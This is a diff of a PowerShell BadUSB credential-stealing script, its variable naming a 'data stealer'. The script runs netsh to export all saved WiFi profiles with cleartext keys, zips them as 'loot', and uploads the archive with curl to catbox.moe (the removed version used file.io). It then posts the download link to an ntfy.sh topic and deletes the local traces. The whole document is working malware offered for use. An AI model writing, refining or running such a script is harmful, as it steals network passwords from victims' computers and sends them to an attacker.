@@ -1,46 +1,50 @@
 $topic = "data_stwealer_hideen_"
 
-Write-Host "=== DEBUG START ===" -ForegroundColor Cyan
+Write-Host "=== [ BADUSB DEBUG CONSOLE ] ===" -ForegroundColor Cyan
 
-# 1. Setup folders
+# 1. Setup Workspace
 $dir = "$env:TEMP\LootBox"
+$zip = "$env:TEMP\package.zip"
+
 if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
 mkdir $dir | Out-Null
-$zip = "$env:TEMP\package.zip"
 if (Test-Path $zip) { Remove-Item -Force $zip }
 
-# 2. Try to grab WiFi
-Write-Host "[*] Exporting WiFi Profiles..."
+# 2. Export WiFi Profiles
+Write-Host "[*] Extracting WiFi Profiles..." -ForegroundColor White
 netsh wlan export profile folder=$dir key=clear | Out-Null
 
-# 3. Zip it
-Write-Host "[*] Zipping files..."
+$fileCount = (Get-ChildItem $dir).Count
+Write-Host "[+] Found $fileCount profiles." -ForegroundColor Green
+
+# 3. Create ZIP
+Write-Host "[*] Creating ZIP Archive..." -ForegroundColor White
 Add-Type -Assembly "System.IO.Compression.FileSystem"
 [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
 
-# 4. Check if ZIP exists and has data
+# 4. Upload to Catbox (Reliable Stealth Uploader)
 if (Test-Path $zip) {
-    $size = (Get-Item $zip).Length
-    Write-Host "[+] ZIP Created ($size bytes)" -ForegroundColor Green
+    Write-Host "[*] Uploading to Catbox..." -ForegroundColor Yellow
     
-    # 5. Upload to file.io
-    Write-Host "[*] Uploading to file.io..."
-    $response = curl.exe -s -F "file=@$zip" https://file.io
+    # We use curl to send the file to Catbox's API
+    $link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
     
-    if ($response -match '"link":"([^"]+)"') {
-        $link = $matches[1]
+    if ($link -like "http*") {
         Write-Host "[!] SUCCESS! Link: $link" -ForegroundColor Green
+        
+        # 5. Send to ntfy.sh
+        Write-Host "[*] Sending to ntfy..." -ForegroundColor White
         Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
+        Write-Host "[+] Notification Sent!" -ForegroundColor Green
     } else {
-        Write-Host "[-] Upload failed. Response: $response" -ForegroundColor Red
+        Write-Host "[-] Upload Failed. Response: $link" -ForegroundColor Red
     }
-} else {
-    Write-Host "[-] Error: ZIP was never created." -ForegroundColor Red
 }
 
-# 6. NEVER EXIT
-Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
-Write-Host "The window is staying open for you to read." -ForegroundColor Yellow
-Read-Host "Press Enter to clean up files and exit"
+# 6. Debug Pause
+Write-Host "`n================================" -ForegroundColor Cyan
+Write-Host "DONE. Press ENTER to delete local loot and exit." -ForegroundColor Yellow
+Read-Host
 
+# Cleanup
 Remove-Item -Recurse -Force $dir, $zip
